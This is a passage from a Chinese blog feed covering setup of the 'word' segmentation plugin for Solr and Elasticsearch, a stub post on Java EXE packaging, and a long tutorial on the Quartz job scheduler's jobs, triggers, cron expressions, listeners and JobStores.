  　　2、创建目录solr-4.7.1/example/solr/lib，将target/word-1.0.jar文件复制到lib目录  　　3、配置schema指定分词器　　将solr-4.7.1/example/solr/collection1/conf/schema.xml文件中所有的　　<tokenizer class="solr.WhitespaceTokenizerFactory"/>和　　<tokenizer class="solr.StandardTokenizerFactory"/>全部替换为　　<tokenizer class="org.apdplat.word.solr.ChineseWordTokenizerFactory"/>　　并移除所有的filter标签 　　4、如果需要使用特定的分词算法：　　<tokenizer class="org.apdplat.word.solr.ChineseWordTokenizerFactory" segAlgorithm="ReverseMinimumMatching"/>　　segAlgorithm可选值有：　　正向最大匹配算法：MaximumMatching　　逆向最大匹配算法：ReverseMaximumMatching　　正向最小匹配算法：MinimumMatching　　逆向最小匹配算法：ReverseMinimumMatching　　双向最大匹配算法：BidirectionalMaximumMatching　　双向最小匹配算法：BidirectionalMinimumMatching　　双向最大最小匹配算法：BidirectionalMaximumMinimumMatching　　如不指定，默认使用双向最大匹配算法：BidirectionalMaximumMatching 　　5、如果需要指定特定的配置文件：　　<tokenizer class="org.apdplat.word.solr.ChineseWordTokenizerFactory" segAlgorithm="ReverseMinimumMatching"　　conf="C:/solr-4.7.0/example/solr/nutch/conf/word.local.conf"/>　　word.local.conf文件中可配置的内容见 word-1.0.jar 中的word.conf文件　　如不指定，使用默认配置文件，位于 word-1.0.jar 中的word.conf文件    ElasticSearch插件：  　　1、执行命令： mvn clean install dependency:copy-dependencies  　　2、创建目录elasticsearch-1.1.0/plugins/word  　　3、将中文分词库文件target/word-1.0.jar和依赖的日志库文件　　target/dependency/slf4j-api-1.6.4.jar　　target/dependency/logback-core-0.9.28.jar　　target/dependency/logback-classic-0.9.28.jar　　复制到刚创建的word目录  　　4、修改文件elasticsearch-1.1.0/config/elasticsearch.yml，新增如下配置：　　index.analysis.analyzer.default.type : "word"　　index.analysis.tokenizer.default.type : "word"  　　5、启动ElasticSearch测试效果，在Chrome浏览器中访问：　　http://localhost:9200/_analyze?analyzer=word&text=杨尚川是APDPlat应用级产品开发平台的作者  　　6、自定义配置　　从word-1.0.jar中提取配置文件word.conf，改名为word.local.conf，放到elasticsearch-1.1.0/plugins/word目录下  　　7、指定分词算法　　修改文件elasticsearch-1.1.0/config/elasticsearch.yml，新增如下配置：　　index.analysis.analyzer.default.segAlgorithm : "ReverseMinimumMatching"　　index.analysis.tokenizer.default.segAlgorithm : "ReverseMinimumMatching"  　　这里segAlgorithm可指定的值有：　　正向最大匹配算法：MaximumMatching　　逆向最大匹配算法：ReverseMaximumMatching　　正向最小匹配算法：MinimumMatching　　逆向最小匹配算法：ReverseMinimumMatching　　双向最大匹配算法：BidirectionalMaximumMatching　　双向最小匹配算法：BidirectionalMinimumMatching　　双向最大最小匹配算法：BidirectionalMaximumMinimumMatching　　如不指定，默认使用双向最大匹配算法：BidirectionalMaximumMatching 词向量： 　　从大规模语料中统计一个词的上下文相关词，并用这些上下文相关词组成的向量来表达这个词。　　通过计算词向量的相似性，即可得到词的相似性。　　相似性的假设是建立在如果两个词的上下文相关词越相似，那么这两个词就越相似这个前提下的。 　　通过运行项目根目录下的脚本demo-word-vector-corpus.bat来体验word项目自带语料库的效果  　　如果有自己的文本内容，可以使用脚本demo-word-vector-file.bat来对文本分词、建立词向量、计算相似性
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
java制作可执行文件EXE文件, zhaoshijie.iteye.com.blog.2061782, Mon, 05 May 2014 18:58:08 +0800
 关键字：java制作可执行文件EXE文件  参考：http://blog.sina.com.cn/s/blog_67ac56e70100xmgx.html
              
              
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
Quartz任务调度器详解, zhaoshijie.iteye.com.blog.2055479, Fri, 25 Apr 2014 22:46:45 +0800
关键字： 参考文章：http://blog.sina.com.cn/s/blog_4d36e1ae0100tost.html 价值文章分享：http://wenku.baidu.com/link?url=UxdYEtPKTR7eVa-JBR21rpl2M_4lTed3n0varjo-sDH4WAAlJWZtB9_9TJroPGwFtJpctBTAVhogtDt9WD-qLiAfOL01Et-0IonZaj3rDum  介绍QuartzQuartz是一个开源的任务调度系统，它能用来调度很多任务的执行。 运行环境Quartz 能嵌入在其他应用程序里运行。 Quartz 能在一个应用服务器里被实例化(或servlet容器), 并 且参与XA事务 Quartz能独立运行（通过JVM）,或者通过RMI Quartz能被集群实例化 任务调度当一个指定给任务的触发器发生时,任 务就被调度执行. 触发器能被创建为: 一天的 某个时间(精确到毫秒级) 一周的 某些天 一个月 的某些天 一年的 某些天 不在一 个Calendar列出的某些天 (例 如工作节假日) 在一个 指定的次数重复 重复到 一个指定的时间/日期 无限重 复 在一个 间隔内重复 能够给任务指定名称和组名.触 发器也能够指定名称和组名,这样可以很好的在调度器里组织起来.一个加入到调度器里的任务可以被多个触发器注册。在J2EE环境里，任务能作为一个分布式（XA） 事务的一部分来执行。 任务执行任务能 够是任何实现Job接口的Java类。 任务类 能够被Quartz实例化,或者被 你的应用框架。 当一个 触发器触发时，调度器会通知实例化了JobListener 和TriggerListener 接口的0个或者多个Java对象(监听器 可以是简单的Java对象, EJBs, 或JMS发布者等). 在任务执行后，这些监听器也会被通知。 当任务 完成时，他们会返回一个JobCompletionCode ，这 个代码告诉调度器任务执行成功或者失败.这个代码也会指示调度器做一些动作-例如 立即再次执行任务。 任务持久化Quartz的设计包含JobStore接口，这个接口能被实现来 为任务的存储提供不同的机制。 应用JDBCJobStore, 所有被配置成“稳定”的任务和触发器能通过JDBC存储在关系数据库里。 应用RAMJobStore, 所有任务和触发器能被存储在RAM里因此不必在程序重起之间保存-一个好处就是不必使用数据库。 事务使用JobStoreCMT（JDBCJobStore的子类），Quartz 能参与JTA事务。 Quartz 能管理JTA事务(开始和 提交)在执行任务之间，这样，任务做的事就可以发生在JTA事务里。 集群Fail-over. Load balancing. 监听器和插件通过实 现一个或多个监听接口，应用程序能捕捉调度事件来监控或控制任务/触发器 的行为。 插件机 制可以给Quartz增加功能，例如保持任务执行的历史记录，或从一个定义好的文件里加载任务和触发器。 Quartz 装配了很多插件和监听器。 1.使用Quartz在我们用调度器之前，调度器需要实例化。我们用SchedulerFactory 来实例它。一旦调度器被实例，我们就可以启动它，置它为stand-by模式，最后关闭它。注意：一旦一个调度器被关闭了，如果我们不重新实例化它，它就不可能被再次启动。直到调度器启动了或者当调度器处于暂停状 态，触发器才能够触发。下面有个简单的例子： SchedulerFactory schedFact = new org.quartz.impl.StdSchedulerFactory(); Scheduler sched = schedFact.getScheduler(); sched.start(); JobDetail jobDetail = new JobDetail(“myJob”, null, DumbJob.class); Trigger trigger = TriggerUtils.makeHourlyTrigger(); // 每个小时触发 trigger.setStartTime(TriggerUtils.getEvenHourDate(new Date())); // 在下个小时开始 trigger.setName(“myTrigger”); sched.scheduleJob(jobDetail, trigger); 就象你看到的，使用Quartz是很简单的。在下一节我们介绍Jobs和Triggers。 2.Jobs 和 Triggers就象以前提到的，一个实现了Job接口的Java类就能够被调度器执行。接口如下： package org.quartz; public interface Job { public void execute(JobExecutionContext context) throws JobExecutionException; } 很简的，当Job的trigger触发时，Job的execute(..)方法就会被调度器调用。被传递到这个方法里来的 JobExecutionContext对象提供了带有job运行时的信息：执行它的调度器句柄、触发它的触发器句柄、job的JobDetail对象和一些其他的项。 JobDetail对象是Job在被加到调度器里时所创建的，它包含有很多的Job属性设置，和JobDataMap一样，可以用来存储job实例时的一些状态信息。 Trigger对象是用来触发执行Job的。当调度一个job时，我们实例一个触发器然后调整它的属性来满足job执行的条件。触发器也有一个和它相关的JobDataMap，它是用来给被触发器触发的job传参数的。Quartz有一些不同的触发器类型，不过，用得最多的是SimpleTrigger和CronTrigger。 如果我们需要在给定时刻执行一次job或者在给定时刻触发job随后间断一定时间不停的执行的话，SimpleTrigger是个简单的解决办法；如果我们想基于类似日历调度的触发job的话，比如说，在每个星期五的中午或者在每个月第10天的10：15触 发job时，CronTrigger是很有用的。 为什么用jobs和triggers呢？很多任务调度器并没有任务和触发器的概念，一些任务调度器简单定义一个“job”为在一个执行时间伴随一些小任务标示，其他的更像Quartz里job和trigger对象的联合体。在开发Quartz时，开发者们决定，在调度时间表和在这上面运行的工作应该分开。这是很有用的。 例如，job能够独立于触发器被创建和储存在任务调度器里，并且，很多的触发器能够与同一个job关联起来。这个松耦合的另一个好处就是在与jobs关联的触发器终止后，我们能够再次配置保留在调度器里的jobs，这样的话，我们能够再次调度这些jobs而不需要重新定义他们。我们也可以在不重新定义一个关联到job 的触发器的情况下，修改或替代它。 当Jobs和triggers被注册到Quartz的调度器里时，他们就有了唯一标示符。他们也可以被放到“groups”里，Groups是用来组织分类jobs和triggers的，以便今后的维护。在一个组里的job和trigger的名字必须是唯一的，换句话说，一个job和trigger 的全名为他们的名字加上组名。如果把组名置为”null”，系统会自动给它置为Scheduler.DEFAULT_GROUP 现在，我们大概有了一些jobs和triggers的理解，随后2节我们将根多的了解它们。 3.更多关于Jobs & JobDetailsJobs很容易实现，这儿有更多我们需要理解的东西：jobs的本质，job接口的execute(..)方法，关于JobDetails。 当我们实现的一个class是真正的”job”时，Quartz需要知道各种job有的属性，这是通过JobDetail类做到的。在没用JobDetail之前，JobDetail的功能的实现是通过在每个job的实现类上加上所有的现在JobDetail的get方法来实现的。这就在每个job类上强加了一些实现一样功能的代码，就显得每个job类很笨重，于是，Quartz开发者们就创造了JobDetail类。 现在，我们来讨论一下在Quartz里job的本质和job实例的生命周期。首先我们来看看第一节的代码片段： JobDetail jobDetail = new JobDetail(“myJob”,      // job 名称 sched.DEFAULT_GROUP, // job组名(可以写’null’来用default group) DumbJob.class);         //要执行的java类 Trigger trigger = TriggerUtils.makeDailyTrigger(8, 30); trigger.setStartTime(new Date()); trigger.setName(“myTrigger”); sched.scheduleJob(jobDetail, trigger); 现在我们定义“DumbJob”类： public class DumbJob implements Job { public DumbJob() { } public void execute(JobExecutionContext context) throws JobExecutionException { System.err.println(“DumbJob is executing.”); } } 可以看到我们给调度器一个JobDetail实例，并且，它通过job的类代码引用这个job来执行。每次调度器执行job时，它会在调用job的execute(..)方法之前创建一个他的实例。这就带来了两个事实：一、 job必 须有一个不带参数的构造器，二、在job类里定义数据成员并没有意义，因为在每次job执 行的时候他们的值会被覆盖掉。 你可能现在想要问“我怎样给一个job实例提供属性/配置？”和“在几次执行间我怎样能跟踪job的状态？”这些问题的答案是一样的：用JobDataMap- JobDetail对象的一部分。 JobDataMapJobDataMap能够支持任何序列化的对象，当job执行时，这些对象能够在job实例中可用。JobDataMap实现了Java Map接口，它有一些附加的方法，这些方法用来储存和跟踪简单类型 的数据。 如下代码可以很快地给job增加JobDataMap： jobDetail.getJobDataMap().put(“jobSays”, “Hello World!”); jobDetail.getJobDataMap().put(“myFloatValue”, 3.141f); jobDetail.getJobDataMap().put(“myStateData”, new ArrayList()); 在job执行时，我们可以在job里 通过如下代码得到JobDataMap： public class DumbJob implements Job { public DumbJob() { } public void execute(JobExecutionContext context) throws JobExecutionException { String instName = context.getJobDetail().getName(); String instGroup = context.getJobDetail().getGroup(); JobDataMap dataMap = context.getJobDetail().getJobDataMap(); String jobSays = dataMap.getString(“jobSays”); float myFloatValue = dataMap.getFloat(“myFloatValue”); ArrayList state = (ArrayList)dataMap.get(“myStateData”); state.add(new Date()); System.err.println(“Instance ” + instName + ” of DumbJob says: ” + jobSays); } } 如果用一个持久JobStore（在指南JobStore章节讨论），我们就应该注意在JobDataMap里放些什么，因为在它里面的对象将会被序列化，并且这些对象会因此产生一些class-versioning问题。明显的，标准Java类型应该是很安全的，但是，任何时候某人改变了一个你已经序列化的实例的类的定义时，我们就要注意不能够破坏兼容性了。在这个方面的进一步信息 可以在Java Developer Connection Tech Tip: Serialization In The Real World里找到。我们能把JDBC-JobStore和JobDataMap放到一个模式里，在那里，只有简单类型和String型能被储存在Map 里， 从而消去任何以后的序列化问题。 Stateful vs. Non-Stateful Jobs 触发器也有与它们关联的JobDataMaps。假设我们有一个储存在调度器里被多个触发器关联的job，然而，对于每个独立的触发器，我想提供给job不同的数据输入，在这个时候，JobDataMaps就很有用了。 在job执行期间，JobDataMaps能够在JobExecutionContext里获得。JobDataMap融合在Trigger和JobDetail类里，JobDataMap里面的值能够利用key来更新。 以下例子显示，在job执行期间从JobExecutionContext里的JobDataMap得到数据： public class DumbJob implements Job { public DumbJob() { } public void execute(JobExecutionContext context) throws JobExecutionException { String instName = context.getJobDetail().getName(); String instGroup = context.getJobDetail().getGroup(); JobDataMap dataMap = context.getJobDataMap();  // 注意：不同于以前的例子 String jobSays = dataMap.getString(“jobSays”); float myFloatValue = dataMap.getFloat(“myFloatValue”); ArrayList state = (ArrayList)dataMap.get(“myStateData”); state.add(new Date()); System.err.println(“Instance ” + instName + ” of DumbJob says: ” + jobSays); } } StatefulJob现在，关于job状 态数据的一些附加要点：一个job实例能定义为”有 状态的”或者”无状态的”。无状态的jobs仅当它们在被加入到调度器里时才存储JobDataMap。这就意味着，在jobs执行期间对JobDataMap里数据的任何改变都会丢失，下次执行时job将 看不到这些数据。你可能会猜到，一个有状态的job就是它的反面例子-它的JobDataMap是在每次执行完job后再次储存的。一个缺点就是有状态的job不能够并发执行。换句话说，如果job是有状态的，一个触发器尝试触发这个已经执行了的job时，这个触发器就会等待直到这次执行结束。 用实现StatefulJob 接 口来标记一个job是有状态的。 Job ‘Instances’我们能够创建一个单独的job类，并且通过创建多个JobDetails实例在调度器里储存很多它的“实例定义”，每个都有它自己的属性集和JobDataMap ，把它们都加入到调度器里。 当一个触发器触发时，与它关联的job就 是通过配置在调度器上的JobFactory 来实例化的。默认的JobFactory 简单的调用在job类上的newInstance()方法，你可能想要创建自己的JobFactory实现来完成一些自己想要的事情，如：拥有应用程序的 IoC或 者DI容器进程/初始化job实 例。 job的其他属性这儿有一个其他属性的总结，这些属性是通 过JobDetail对象为一个job实例定义的。 持久性– 如果一个job是 非持久的，一旦没有任何可用的触发器与它关联时，他就会自动得从调度器里被删除。 不稳定 性-如果一个job是 不稳定的，他就不会在重起Quartz调度器之间持久化。 请求恢 复– 如果一个job“请 求恢复”，在调度器“硬关闭”（如：该进程崩溃，机器被关掉）时这个job还在执行，过后，当调度器再次启动时，他就会再次执行。在这种情况下，JobExecutionContext.isRecovering() 方法将会返回true. Job监 听器 –一个job能够有0个或者多个与它关联的监听器。当job执行时，监听器就会被通知。在监听器的更多讨论请看TriggerListeners & JobListeners JobExecutionException最后，我们来看看Job.execute(..)方法的一些细节。你能够从execute方法里抛出的仅有的异常类型就是 JobExecutionException。因为这样，我们应该使用try-catch块包围整个execute方法内容。我们还应该花一些时间看看 JobExecutionException文档。当job执行发生异常时，通过设置JobExecutionException，可以让此job再 次进入调度器或者今后不再运行。 4.更多关于Triggers象jobs一样，triggers也相对来说很容易。但是，我们还是要理解它的一些特性。Quartz里也有很多类型的trigger提供给我们使用。 CalendarsQuartz Calendar 对象（不是java.util.Calendar对象）能够在trigger储存在调度器时和trigger关联起来。Calendars主要用来在 trigger配置时排除一些时间。例如，你能够创建一个在每个工作日早上9：30触发的trigger，然后为这个trigger增加一个排除所有商业的节假日的Calendar。 Calendars能够是任何序列化的对象，只要这些对象实现了Calendar接口： package org.quartz; public interface Calendar { public boolean isTimeIncluded(long timeStamp); public long getNextIncludedTime(long timeStamp); } 注意到这些方法的参数类型是long。这意味着calendars能够排除毫秒级的时间段。大部分地，我们感兴趣的是一整天的，所以在Quartz里，有个实现类提供了方便：org.quartz.impl.HolidayCalendar Calendars必须被实例化并且通过addCalendar(..)方法注册到调度器里。如果你用HolidayCalendar，在实例它之后，你应该用它的addExcludedDate(Date date)方法以便组装上你想排除的那几天。一个calendar实例能够被多个triggers使用： HolidayCalendar cal = new HolidayCalendar(); cal.addExcludedDate( someDate ); sched.addCalendar(“myHolidays”, cal, false); Trigger trigger = TriggerUtils.makeHourlyTrigger(); // 每小时触发 trigger.setStartTime(TriggerUtils.getEvenHourDate(new Date()));  //下一个小时开始  trigger.setName(“myTrigger1″); trigger.setCalendarName(“myHolidays”); // .. schedule job with trigger Trigger trigger2 = TriggerUtils.makeDailyTrigger(8, 0); // 每天早上8点触发 trigger2.setStartTime(new Date()); //立即开始 trigger2.setName(“myTrigger2″); trigger2.setCalendarName(“myHolidays”); // .. schedule job with trigger2 不触发(misfire)指令触发器的另外一个重要的属性是“不触发指令”。如果一个持久的触发器由于调度器被关闭了而没有找到它的触发时间，那么一个不触发将会发生。不同的触发器类型有不同的不触发指令。默认的，他们都用“smart policy”指令-这是一个基于触发器类型和配置的动态行为。当调度器启动时，他将会搜寻所有没触发的持久化的triggers，然后基于他们各个配置的不触发指令来更新他们。当你用Quartz，你应该熟悉各个不触发指令，我们在以下章节有一些介绍。给一个trigger实例配置不触发指令，要用此实例的setMisfireInstruction(..)方法。 TriggerUtils – Triggers Made EasyTriggerUtils类（在org.quartz包里）包含了很多方便的工具。能够帮你创建triggers和datas。用这个类能够很容易制造一些trigges，这些triggers能够在每分钟，每小时，每周，每个月等等触发。用它也能产生一些接近某个秒、分钟、小时的天-这在设置trigger的启动时间很有帮助。 TriggerListeners最后，triggers有一些注册了的监听器，象job一样。实现了TriggerListener接口的对象将接受一个trigger被触发的通知。 5. SimpleTrigger详细介绍一下它的构造器： public SimpleTrigger(String name, //trigger名称 String group, //trigger的组名 Date startTime, //开始时间 Date endTime, //结束时间 int repeatCount, //重复次数 long repeatInterval)//重复间隔 举几个常用例子： 从现在开始10秒后执行一次： long startTime = System.currentTimeMillis() + 10000L; SimpleTrigger trigger = new SimpleTrigger(“myTrigger”, null, new Date(startTime), null, 0, 0L); 立即执行，60秒间隔无限制重复： SimpleTrigger trigger = new SimpleTrigger(“myTrigger”, null, new Date(), null, SimpleTrigger.REPEAT_INDEFINITELY, 60L * 1000L); 从现在开始立即执行，每10秒重复，直到40秒 后： long endTime = System.currentTimeMillis() + 40000L; SimpleTrigger trigger = new SimpleTrigger(“myTrigger”, “myGroup”, new Date(), new Date(endTime), SimpleTrigger.REPEAT_INDEFINITELY, 10L * 1000L); 在2002年3月17号10：30am触发，重复5次（一共6次），30秒 间隔： java.util.Calendar cal = new java.util.GregorianCalendar(2002, cal.MARCH, 17); cal.set(cal.HOUR, 10); cal.set(cal.MINUTE, 30); cal.set(cal.SECOND, 0); cal.set(cal.MILLISECOND, 0); Data startTime = cal.getTime(); SimpleTrigger trigger = new SimpleTrigger(“myTrigger”, null, startTime, null, 5, 30L * 1000L); SimpleTrigger 不触发指令MISFIRE_INSTRUCTION_FIRE_NOW MISFIRE_INSTRUCTION_RESCHEDULE_NOW_WITH_EXISTING_REPEAT_COUNT MISFIRE_INSTRUCTION_RESCHEDULE_NOW_WITH_REMAINING_REPEAT_COUNT MISFIRE_INSTRUCTION_RESCHEDULE_NEXT_WITH_REMAINING_COUNT MISFIRE_INSTRUCTION_RESCHEDULE_NEXT_WITH_EXISTING_COUNT 6.CronTrigger构造器CronTrigger(String name, //触发器名称 String group, //触发器的组名 String jobName, //job名称 String jobGroup, //job的组名 Date startTime, //开始时间 Date endTime, //结束时间 String cronExpression, //克隆表达式 TimeZone timeZone)//时区 还有一些其它参数少一些的构造器，参考JavaDoc。通常我们如下简单地使用CronTrigger； Trigger trigger = new CronTrigger(“trigger1″, “group1″);//设置触发器名称和组名 trigger.setCronexpression_r(“0 0 15 * * ?”);//设置克隆表达式 克隆表达式一个克隆表达式是一个由空白间隔6个或者7个字段的字符串。 格式： 字段名 必须有? 值范围 允许的特殊字符 Seconds YES 0-59 , – * / Minutes YES 0-59 , – * / Hours YES 0-23 , – * / Day of month YES 1-31 , – * ? / L W C Month YES 1-12 or JAN-DEC , – * / Day of week YES 1-7 or SUN-SAT , – * ? / L C # Year NO empty, 1970-2099 , – * /  例子： * * * * ? * 0 0/5 14,18,3-39,52 ? JAN,MAR,SEP MON-FRI 2002-2010 特殊字符* 表示所有值 ； ? 表示未说明的值，即不关心它为何值； - 表示一个指定的范围； , 表示附加一个可能值； / 符号前表示开始时间，符号后表示每次递增的值； L (“last”) “L” 用在day-of-month字段意思是 “这个月最后一天“；用在 day-of-week字段, 它简单意思是 “7″ or “SAT”。 如果在day-of-week字段里和数字联合使用，它的意思就是 “这个月的最后一个星期几“ – 例如： “6L” means “这个月的最后一个星期五“. 当我们用“L”时，不指明一个列表值或者范围是很重要的，不然的话，我们会得到一些意想不到的结果。 W (“weekday”) –只能用在day-of-month字段。用来描叙最接近指定天的工作日（周一到周五）。例如：在day-of-month字段用“15W” 指“最接近这个月第15天的工作日”，即如果这个月第15天是周六，那么触发器将会在这个月第14天即周五触发；如果这个月第15天是周日，那么触发器将会在这个月第16天即周一触发；如果这个月第15天是周二，那么就在触发器这天触发。注意一点：这个用法只会在当前月计算值，不会越过当前月。“W”字符仅能在day-of-month指明一天，不能是一个范围或列表。 也可 以用“LW”来指 定这个月的最后一个工作日。 # -只能用在day-of-week字段。用来指定这个月的第几个周几。例：在day-of-week字段用”6#3″指这个月第3个周五（6指周 五，3指第3个）。 如果指定的日期不存在，触发器就不会触发。 C (“calendar”) – 指和calendar联系后计算过的值。例：在day-of-month 字段用“5C”指在这个月第5天或之后包括calendar的第一天；在day-of-week字段用“1C”指在这周日或之后包括calendar的第一天。 在MONTH和Day of week字段里对字母大小写 不敏感。 一些例子表达式 意思（触发时刻） 0 0 12 * * ? 每天中午12点 0 15 10 * * ? 2005 在2005年的每天10：25 0 10,44 14 ? 3 WED 在3月里每个周三的14：10和14：44 0 15 10 ? * 6L 2002-2005 从2002年到2005年里，每个月的最后一个星期五的10：15 0 0 12 1/5 * ? 从当月的第一天开始，然后在每个月每隔5天的12：00 0 15 10 ? * 6#3 每个月第3个周五的10：15  注意在day-of-week和day-of-month字段里使用“？”和“*”的效 果。 注意对“C”的支持并不很完全。 对在day-of-week字段和在day-of-month字段同时使用也不是很完全（目前你必须在这两个字段中的一个用“？”指定）。 当设 置在午夜和凌晨1点 之间触发时要仔细。 不触发指令： MISFIRE_INSTRUCTION_FIRE_ONCE_NOW MISFIRE_INSTRUCTION_DO_NOTHING 7.TriggerListeners 和JobListeners与Trigger相关的事件有：触发器触发，触发器的不触发（参考先前章节），触发器完成。 public interface TriggerListener { public String getName(); public void triggerFired(Trigger trigger, JobExecutionContext context); public boolean vetoJobExecution(Trigger trigger, JobExecutionContext context); public void triggerMisfired(Trigger trigger); public void triggerComplete(Trigger trigger, JobExecutionContext context, int triggerInstructionCode); } 与job相关的事件有：job准备执行，job执行完毕。 public interface JobListener { public String getName(); public void jobToBeExecuted(JobExecutionContext context); public void jobExecutionVetoed(JobExecutionContext context); public void jobWasExecuted(JobExecutionContext context, JobExecutionException jobException); } 使用Listeners创建一个监听器，就是创建一个实现了org.quartz.TriggerListener 和 org.quartz.JobListener接口的对象。在运行的期间用调度器注册监听器，必须要给它提供一个名字。监听器能够注册成为全局的或者不是全局的，全局监听器接受所有的事件，而非全局的则仅接受指定给triggers/jobs了的事件。 监听器是在运行期间被调度器注册的，他们没有伴随jobs和triggers储存在JobStore里。Jobs和triggers仅储存和它们相关的监听器的名字。因此，每次程序运行时，监听器需要被调度器再次注册。 scheduler.addGlobalJobListener(myJobListener); scheduler.addJobListener(myJobListener); 监听器在Quartz并不是经常使用的。 8.SchedulerListeners和调度器相关的事件有：job/trigger的加入和移出，一些调度器里的错误，调度器关闭等等。 public interface SchedulerListener { public void jobScheduled(Trigger trigger); public void jobUnscheduled(String triggerName, String triggerGroup); public void triggerFinalized(Trigger trigger); public void triggersPaused(String triggerName, String triggerGroup); public void triggersResumed(String triggerName, String triggerGroup); public void jobsPaused(String jobName, String jobGroup); public void jobsResumed(String jobName, String jobGroup); public void schedulerError(String msg, SchedulerException cause); public void schedulerShutdown(); } 创建和注册SchedulerListeners和其他监听器一样，全局和非全局的没有区别。 9.JobStoresJobStore负责保存所有配置到调度器里的工作数据：jobs，triggers，calendars等等。在用 SchedulerFactory得到一个调度器的实例时，我们可以给SchedulerFactory提供一个属性文件或者一个属性对象来声明使用哪个 JobStore。 注意，不要在代码里使用JobStore的实例，这些Quartz都做好了。我们要做的就仅仅告诉Quartz（通过配置）用哪个JobStore，然后就调用Scheduler接口函数了。 RAMJobStore利用内存来持久化调度程序信息。这种作业存储类型最容易配置、构造和 运行，但是当应用程序停止运行时，所有调度信息将被丢失。 在属性文件里指定： org.quartz.jobStore.class = org.quartz.simpl.RAMJobStore JDBCJobStore支持的数据库有：Oracle, MySQL, MS SQLServer2000, HSQLDB, PostreSQL and DB2。使用JDBCJobStore，首先要在数据库里建一些Quartz要使用的表。我们可以使用Quartz发布包里的建表脚本，在 docs/dbTables目录下。如果没有你所要的数据库类型的脚本，可以在已有的脚本作一些修改。所有这些标都是以“QRTZ_”作为前缀的，这个前缀是可以在属性文件里更改的。在为多个调度器实例创建多个系列的表时，用不同的 前缀是很有用的。 一旦我们创建了这些表，在配置和触发JDBCJobStore之前就要做更多的事情了。我们需要决定应用需要哪种类型的事务处理。如果我们不需要给其他的事务处理一些调度命令（增加删除trigger），我们就可以让Quartz利用JobStoreTX处理这个事务（这用的很多）。 如果我们需要Quartz和其他的事务处理（在J2EE应用服务器里）一起工作，我们就应该用JobStoreCMT-这会使Quartz让应用服务器容器管理事务。 最后一点是从哪个JDBCJobStore启动数据库能够得到该数据库的连接。在属性文件里是用一个不同的方法来定义数据源的。一种是Quartz自己创建和管理数据源-提供所有的数据库连接信息；另外一种是利用应用服务器管理的数据源，其中Quartz运行在这个应用服务器里-给JDBCJobStore提供数据库的JNDI名称。 用JDBCJobStore（假设我们是用的StdSchedulerFactory），我们首先要设置 org.quartz.jobStore.class属性为org.quartz.impl.jdbcjobstore.JobStoreTX或者 org.quartz.impl.jdbcjobstore.JobStoreCMT，这取决于我们的选择。 org.quartz.jobStore.class = org.quartz.impl.jdbcjobstore.JobStoreTX 下一步，我们需要选择一个驱动代理。StdJDBCDelegate是一个用“vanilla”JDBC代码实现的代理。如果没有其他为你数据库指定的代理，就使用这个。Quartz开发者们解决的问题都是根据这个代理的来实现的。其他的代理在 org.quartz.impl.jdbcjobstore包或者子包里。包括DB2v6Delegate（DB2 version 6 或早期版本使用的），HSQLDBDelegate（HSQLDB使用），MSSQLDelegate（microsoft SQLServer 2000使用），PostgreSQLDelegate（PostgreSQL 7.x使用），WeblogicDelegate（Weblogic的JDBC驱动器使用），OracleDelegate（Oracle 8i and 9i使 用）。 org.quartz.jobStore.driverDelegateClass = org.quartz.impl.jdbcjobstore.StdJDBCDelegate 在下一步，我们要配置表的前缀： org.quartz.jobStore.tablePrefix = QRTZ_ 最后，我们需要设置用哪个数据源，数据源的名称必须在Quartz属性里定义好。例如，我们可以给Quartz指定使用“myDS”（在配置属性里的其他地方定义好了）作为数据源的名字。 org.quartz.jobStore.dataSource = myDS 如果调度器很繁忙（例如，执行job的个数和线程池的大小一样），那么我们应该设置数据源的连接个数在线 程池大小+1之 上。 org.quartz.jobStore.useProperties这个属性能够设置为“true” （默认为false），用来指示JDBCJobStore：在JobDataMaps里的所有值都应该是String，这样在能作为name-value方式储存，而不是在BLOB列里以序列化的格式储存复杂的对象。从长远看，这样做会很安全，因为你可以避免将非String的类序列化到BLOB里 的类版本问题。 10.配置,资源使用和调度器工厂Quartz是以标准组件的方式组织的，所以，使它运行起来，一些组件 需要被联合起来。 在Quartz能够工作之前，需要配置的主要组件有： 线程池 作业储 存 数据源(需要的话) 调度器 自己 在运行jobs时，线程池为Quartz提供了一系列的线程。在线程池里的线程越多，能够并行执行的jobs就越多。但是，太多的线程会使系统瘫痪。大部分的Quartz用户发现，5个线程就足够了-因为他们在指定时间里只有少于100的jobs，这些jobs并不都是在同一时刻执行，jobs完成得也很快的。其他的用户发现他们需要10、15、50或者100个线程-因为他们在不同的调度器里用了上万个触发器，在给定的时间里，平均在10到 100个jobs试着执行。为调度器找到合适的线程数量完全依赖于你用调度起来做什么。不在乎线程数量，而要确保你有足够的线程来使jobs执行。如果一个触发器的触发时间到来了，可是没有一个能够用的线程，Quartz将会等到可用线程的来临，然后job将会在几毫秒后执行。这可能会引起不触发-如果不在属性文件里给调度器配置“misfire threshold”的话。 线程池接口是在org.quartz.spi包里定义的，你能够创建一个线程池以自己的方法。Quartz装配了一个简单（但是很好的）的线程池，是org.quartz.simpl.SimpleThreadPool。这个线程池简单的维护一些在池里固定的线程-不会增加也不会减少。但是它能够做很多事而且经过测试了的，几乎每个Quartz用户用这个线程池。 JobStores 和 DataSrouces在前面讨论过了，这里值得一提的是，所有JobStores都实现了org.quartz.spi.JobStore接口，如果在打包里的任何一个JobStore不能够满足你的需求的话，你可以自己做一个。 最后，你需要创建你的Scheduler实例。Scheduler需要提供他的名称，说明RMI的设置，处理JobStore和ThreadPool的实例。RMI设置包括调度器是否作为一个RMI服务器而创建。StdSchedulerFactory也能够产生调度器的实例，这些实例实际上是创建在远程进程中的调度器代理（RMI桩）。 StdSchedulerFactoryStdSchedulerFactory实现了org.quartz.SchedulerFactory接口。它用了一系列的属性（java.util.Properties）来创建和初始化一个Quartz的调度器。这些属性通常保存和加载在一个文件里，但是也可以通过你的程序创建直接交给工厂处理。在工厂上调用getScheduler()就可以产生调度器，初始化它（还有线程池，JobStore和数据源），然后返回一个句柄到这个公共的接口。 // 默认调度器是quartz.propeties文件定义的，这个文件可以在当前目录下找到，也可以在//classpath里找到，如果都找不到了，就用quartz.jar里的quartz.propeties文件。 SchedulerFactory sf = new StdSchedulerFactory(); Scheduler scheduler = sf.getScheduler(); scheduler.start(); 用指定的属性对象初始化： SchedulerFactory sf = new StdSchedulerFactory(); sf.initialize(schedulerProperties);// schedulerProperties是属性对象 Scheduler scheduler = sf.getScheduler(); 